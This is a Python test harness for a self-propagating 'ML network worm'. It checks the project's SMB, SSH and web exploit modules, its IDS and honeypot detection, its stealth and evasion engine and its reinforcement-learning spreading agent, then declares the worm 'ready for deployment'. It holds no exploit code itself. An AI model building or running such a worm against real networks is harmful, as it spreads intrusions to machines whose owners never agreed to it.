"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
ML Network Worm v2.0 - Component Test Suite
Tests all major components with detailed reporting
"""


import os
import sys
import time
import warnings
from typing import List, Tuple

# Suppress gymnasium deprecation warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
warnings.filterwarnings("ignore", message=".*Gym.*")


# ANSI color codes for better output (works on Windows 10+)
class Colors:
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKCYAN = "\033[96m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"


# Enable ANSI colors on Windows
if sys.platform == "win32":
    os.system("color")


def print_header(text: str):
    """Print formatted header"""
    print(f"\n{Colors.HEADER}{Colors.BOLD}{'='*70}{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}{text.center(70)}{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}{'='*70}{Colors.ENDC}\n")


def print_test(num: int, name: str):
    """Print test header"""
    print(f"{Colors.OKCYAN}{Colors.BOLD}[{num}/10]{Colors.ENDC} Testing {name}...", end=" ")


def print_success(message: str = "OK"):
    """Print success message"""
    print(f"{Colors.OKGREEN}✓ {message}{Colors.ENDC}")


def print_failure(error: str):
    """Print failure message"""
    print(f"{Colors.FAIL}✗ FAILED{Colors.ENDC}")
    print(f"{Colors.FAIL}      Error: {error}{Colors.ENDC}")


def print_info(message: str, indent: int = 6):
    """Print info message"""
    print(f"{' '*indent}{Colors.OKBLUE}{message}{Colors.ENDC}")


# Test results tracking
test_results: List[Tuple[str, bool, float, str]] = []


def run_test(num: int, name: str, test_func):
    """Run a single test with timing and error handling"""
    print_test(num, name)
    start_time = time.time()

    try:
        result = test_func()
        elapsed = time.time() - start_time

        if result["success"]:
            print_success(result.get("message", "OK"))
            if "details" in result:
                for detail in result["details"]:
                    print_info(detail)
            test_results.append((name, True, elapsed, ""))
        else:
            print_failure(result.get("error", "Unknown error"))
            test_results.append((name, False, elapsed, result.get("error", "Unknown")))

    except Exception as e:
        elapsed = time.time() - start_time
        print_failure(str(e))
        test_results.append((name, False, elapsed, str(e)))


# ============================================================================
# TEST DEFINITIONS
# ============================================================================


def test_configuration():
    """Test 1: Configuration System"""
    try:
        from configs.config import Config
    except ImportError:
        from configs.config import Config
    config = Config()

    if config.validate():
        return {
            "success": True,
            "message": "Configuration validated",
            "details": [
                f"Target ranges: {len(config.network.target_ranges)}",
                f"Max infections: {config.propagation.max_infections}",
                f"Stealth mode: {config.evasion.stealth_mode}",
            ],
        }
    else:
        return {"success": False, "error": "Configuration validation failed"}


def test_exploit_manager():
    """Test 2: Exploit Manager"""
    from configs.config import Config
    from exploits.exploit_manager import ExploitManager

    config = Config()
    manager = ExploitManager(config)

    return {
        "success": True,
        "message": f"Loaded {len(manager.exploits)} exploits",
        "details": [
            f"Credentials loaded: {len(manager.credentials_db)}",
            f"Exploit modules initialized",
        ],
    }


def test_smb_exploit():
    """Test 3: SMB Exploit Module"""
    from exploits.modules.smb_exploit import SMBExploit

    smb = SMBExploit()
    test_target = {
        "ip": "192.168.1.100",
        "open_ports": [445],
        "os_guess": "Windows",
        "vulnerability_score": 75,
    }

    vulnerable = smb.check_vulnerable(test_target)

    return {
        "success": True,
        "message": "SMB exploit initialized",
        "details": [f"Vulnerability check: {vulnerable}"],
    }


def test_ssh_exploit():
    """Test 4: SSH Exploit Module"""
    from exploits.modules.ssh_exploit import SSHExploit

    ssh = SSHExploit()
    test_target = {
        "ip": "192.168.1.101",
        "open_ports": [22],
        "os_guess": "Linux",
        "vulnerability_score": 60,
    }

    vulnerable = ssh.check_vulnerable(test_target)

    return {
        "success": True,
        "message": "SSH exploit initialized",
        "details": [f"Vulnerability check: {vulnerable}"],
    }


def test_web_exploit():
    """Test 5: Web Exploit Module"""
    from exploits.modules.web_exploit import WebExploit

    web = WebExploit()
    test_target = {
        "ip": "192.168.1.102",
        "open_ports": [80, 443],
        "os_guess": "Linux",
        "vulnerability_score": 65,
    }

    vulnerable = web.check_vulnerable(test_target)

    return {
        "success": True,
        "message": "Web exploit initialized",
        "details": [f"Vulnerability check: {vulnerable}"],
    }


def test_ids_detector():
    """Test 6: IDS Detection System"""
    try:
        from configs.config import Config
    except ImportError:
        from configs.config import Config
    from evasion.ids_detector import IDSDetector

    config = Config()
    detector = IDSDetector(config)

    return {
        "success": True,
        "message": "IDS detector operational",
        "details": ["Honeypot detection enabled"],
    }


def test_stealth_engine():
    """Test 7: Stealth & Evasion Engine"""
    try:
        from configs.config import Config
    except ImportError:
        from configs.config import Config
    from evasion.stealth_engine import StealthEngine

    config = Config()
    stealth = StealthEngine(config)
    delay = stealth.get_scan_delay("192.168.1.100")

    return {
        "success": True,
        "message": f"Stealth engine active (delay: {delay:.2f}s)",
        "details": ["Timing randomization enabled", "Traffic obfuscation ready"],
    }


def test_rl_agent():
    """Test 8: Reinforcement Learning Agent"""
    import numpy as np

    from rl_engine.propagation_agent import PropagationAgent

    agent = PropagationAgent(state_size=60, action_size=20, use_dqn=False)
    test_state = np.random.random(60)
    action = agent.act(test_state)

    return {
        "success": True,
        "message": f"RL agent operational (action: {action})",
        "details": ["State space: 60 dimensions", "Action space: 20 options"],
    }


def test_visualizer():
    """Test 9: Network Visualizer"""
    import shutil

    from utils.visualizer import WormVisualizer

    viz = WormVisualizer(output_dir="test_viz")
    viz.add_host("192.168.1.1")
    viz.mark_infected("192.168.1.1")

    # Cleanup
    if os.path.exists("test_viz"):
        shutil.rmtree("test_viz")

    return {
        "success": True,
        "message": "Visualizer ready",
        "details": ["Graph generation functional"],
    }


def test_exploit_selection():
    """Test 10: Intelligent Exploit Selection"""
    try:
        from configs.config import Config
    except ImportError:
        from configs.config import Config
    from exploits.exploit_manager import ExploitManager

    config = Config()
    manager = ExploitManager(config)

    test_target = {
        "ip": "192.168.1.100",
        "open_ports": [22, 80, 445],
        "os_guess": "Windows",
        "banners": {},
        "vulnerability_score": 70,
    }

    applicable = manager.select_exploits(test_target)

    return {
        "success": True,
        "message": f"{len(applicable)} exploits selected",
        "details": [f"- {exp.name}" for exp in applicable[:3]],
    }


# ============================================================================
# MAIN TEST EXECUTION
# ============================================================================


def main():
    """Run all tests and generate report"""
    print_header("ML NETWORK WORM v2.0 - TEST SUITE")

    start_time = time.time()

    # Run all tests
    run_test(1, "Configuration System", test_configuration)
    run_test(2, "Exploit Manager", test_exploit_manager)
    run_test(3, "SMB Exploit Module", test_smb_exploit)
    run_test(4, "SSH Exploit Module", test_ssh_exploit)
    run_test(5, "Web Exploit Module", test_web_exploit)
    run_test(6, "IDS Detection System", test_ids_detector)
    run_test(7, "Stealth & Evasion Engine", test_stealth_engine)
    run_test(8, "Reinforcement Learning Agent", test_rl_agent)
    run_test(9, "Network Visualizer", test_visualizer)
    run_test(10, "Intelligent Exploit Selection", test_exploit_selection)

    total_time = time.time() - start_time

    # Generate summary report
    print_header("TEST SUMMARY")

    passed = sum(1 for _, success, _, _ in test_results if success)
    failed = len(test_results) - passed

    print(f"{Colors.BOLD}Results:{Colors.ENDC}")
    print(f"  {Colors.OKGREEN}✓ Passed: {passed}/10{Colors.ENDC}")
    if failed > 0:
        print(f"  {Colors.FAIL}✗ Failed: {failed}/10{Colors.ENDC}")

    print(f"\n{Colors.BOLD}Performance:{Colors.ENDC}")
    print(f"  Total time: {total_time:.2f}s")
    print(f"  Average per test: {total_time/len(test_results):.2f}s")

    if failed > 0:
        print(f"\n{Colors.BOLD}{Colors.FAIL}Failed Tests:{Colors.ENDC}")
        for name, success, elapsed, error in test_results:
            if not success:
                print(f"  {Colors.FAIL}✗ {name}{Colors.ENDC}")
                print(f"    {Colors.FAIL}└─ {error}{Colors.ENDC}")

    print(f"\n{Colors.BOLD}Status:{Colors.ENDC}")
    if passed == 10:
        print(f"  {Colors.OKGREEN}{Colors.BOLD}✅ ALL SYSTEMS OPERATIONAL{Colors.ENDC}")
        print(f"  {Colors.OKGREEN}The worm v2.0 is ready for deployment!{Colors.ENDC}")
    elif passed >= 7:
        print(f"  {Colors.WARNING}⚠️  MOST SYSTEMS OPERATIONAL{Colors.ENDC}")
        print(f"  {Colors.WARNING}Some components need attention{Colors.ENDC}")
    else:
        print(f"  {Colors.FAIL}❌ CRITICAL FAILURES DETECTED{Colors.ENDC}")
        print(f"  {Colors.FAIL}System not ready for deployment{Colors.ENDC}")

    print(f"\n{Colors.HEADER}{'='*70}{Colors.ENDC}\n")

    return passed == 10


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
